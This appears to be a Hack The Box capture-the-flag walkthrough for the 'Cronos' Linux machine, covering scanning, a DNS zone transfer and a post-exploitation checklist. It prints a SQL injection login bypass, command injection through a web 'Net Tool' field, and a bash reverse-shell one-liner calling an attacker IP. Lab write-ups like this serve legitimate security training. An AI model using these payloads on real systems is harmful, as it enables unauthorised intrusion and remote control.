---
layout: default
title: Cronos
parent: Hack The Box - Linux
nav_order: 1
---

# Scanning

---

```bash
┌──(kali㉿kali)-[~/Documents/HTB/linux]
└─$ sudo nmap -Pn -p- -sC -sV -T4 -vv --open 10.129.254.3

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

---

## DNS | 53

We are able to get the domain for the DNS server `ns1.cronos.htb`

```bash
┌──(kali㉿kali)-[~/Documents/HTB/linux]
└─$ nslookup
> server 10.129.254.3
Default server: 10.129.254.3
Address: 10.129.254.3#53
> 10.129.254.3
3.254.129.10.in-addr.arpa       name = ns1.cronos.htb.

```

We can also perform a zone transfer using `dig`

```bash
┌──(kali㉿kali)-[~/Documents/HTB/linux]
└─$ dig axfr cronos.htb @10.129.254.3

; <<>> DiG 9.19.17-2~kali1-Kali <<>> axfr cronos.htb @10.129.254.3
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 71 msec
;; SERVER: 10.129.254.3#53(10.129.254.3) (TCP)
;; WHEN: Thu Apr 04 23:40:49 EDT 2024
;; XFR size: 7 records (messages 1, bytes 203)

```

This reveals the additional subdomains `admin` and `www`

Update the host file with these entries

```bash
127.0.0.1       localhost
127.0.1.1       kali


10.129.254.3    cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

```

## HTTP | 80

Navigating to the `admin.cronos.htb` site we get a login page.

![admin](../../../assets/images/ctfs/hack_the_box/cronos/admin.png)

The login page is able to be bypassed with a SQL injection attack

```bash
' or 1=1-- -
```

![sqli](../../../assets/images/ctfs/hack_the_box/cronos/sqli.png)

This brings us to a `welcome.php` page with a Net Tool

![welcome](../../../assets/images/ctfs/hack_the_box/cronos/welcome.png)

If we chain a command together in the traceroute field we are able to demonstrate code injection by displaying the `www-data` username.

![command](../../../assets/images/ctfs/hack_the_box/cronos/command.png)

# Exploitation

---

We should be able to execute a reverse shell command from the Net Tool text field.

We can generate a oneliner with `https://www.revshells.com/`

```bash
bash -i >& /dev/tcp/10.10.14.27/445 0>&1
```

If we intercept the request in Burp we can send the encoded request and get a reverse shell

![repeater](../../../assets/images/ctfs/hack_the_box/cronos/repeater.png)

![shell](../../../assets/images/ctfs/hack_the_box/cronos/shell.png)

# Post-Exploitation

---

- [ ] Upgrade to TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty size
stty raw -echo
fg
stty rows <first_value>
stty cols <second_value>
export TERM=xterm-256color
```

- [ ] sudo -l
- [ ] enumerate users
- [ ] SUID/GUID

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

- [ ] enumerate process running with root privileges

```bash
ps -aux | grep -i 'root'
```

- [ ] enumerate network services

```bash
netstat -antup (ss -tunlp)
```

- [ ] check for extended capabilities

```bash
getcap -r / 2>/dev/null
```

- [ ] test discovered credentials against all users
- [ ] attempt hydra ssh password crack for discovered users
- [ ] check _/opt_, _/tmp_, _/var/tmp_, _/etc_, and _/dev/shm_
- [ ] Check if /etc/passwd is writeable
- [ ] Check for aliases (e.g. root)

```bash
compgen -a
```
